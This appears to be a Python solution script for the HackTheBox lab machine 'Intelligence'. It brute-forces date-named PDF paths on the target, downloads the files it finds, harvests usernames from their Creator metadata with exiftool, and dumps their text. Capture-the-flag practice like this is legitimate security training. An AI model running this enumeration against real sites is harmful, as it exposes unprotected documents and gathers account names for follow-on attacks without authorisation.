import requests
from pypdf import PdfReader
import os
from colorama import Fore, Style

base_url = "http://intelligence.htb"

def log(mode, msg):
    match mode:
        case "success":
            print(Fore.GREEN + f"[+] {msg}" + Style.RESET_ALL)
        case "error":
            print(Fore.RED + f"[-] {msg}" + Style.RESET_ALL)
        case "info":
            print(Fore.BLUE + f"[*] {msg}" + Style.RESET_ALL)
        case "warning":
            print(Fore.YELLOW + f"[!] {msg}" + Style.RESET_ALL)
    return

def pdfread(filename):
    reader = PdfReader(f"./pdfs/{filename}")
    pages = len(reader.pages)

    text = ""
    for i in range(pages):
        text += reader.pages[i].extract_text()
    
    with open("pdf_content.txt", "a") as f:
        f.write(f"[{filename}]\n\n")
        f.write(f"{text}\n\n\n\n")
    return

def exiftool(filename):
    user = os.popen(f"exiftool ./pdfs/{filename} | grep Creator").read().split()[2]
    log("success", f"User found: {user}.")
    return user

def main():
    os.makedirs("./pdfs", exist_ok=True)
    files = []
    users = set()

    log("info", "Enumerating PDF files...")
    for y in range(2020, 2022):
        for m in range(1,13):
            for d in range(1,32):
                year = str(y)
                month = str(m)
                day = str(d)
                if len(month) == 1:
                    month = f"0{month}"
                if len(day) == 1:
                    day = f"0{day}"
                
                filename = f"{year}-{month}-{day}-upload.pdf"

                try:
                    r = requests.get(f"{base_url}/documents/{filename}")
                except requests.exceptions.RequestException as e:
                    log("error", f"Unexpected error: {e}.")
                    exit(0)
                
                if r.status_code == 200:
                    log("success", f"File found: {filename}.")
                    files.append(filename)
                    with open(f"./pdfs/{filename}", "wb") as f:
                        f.write(r.content)
    
    print()
    log("info", "Extracting usernames...")
    for file in files:
        users.add(exiftool(file))
    
    with open("users.txt", "w") as f:
        for u in users:
            f.write(f"{u}\n")
    log("success", "All users saved in users.txt.")

    print()
    log("info", "Extracting PDF content...")
    open("pdf_content.txt", "w").close()
    for file in files:
        pdfread(file)
    log("success", "All PDF content saved in pdf_content.txt.")

    return

if __name__ == "__main__":
    main()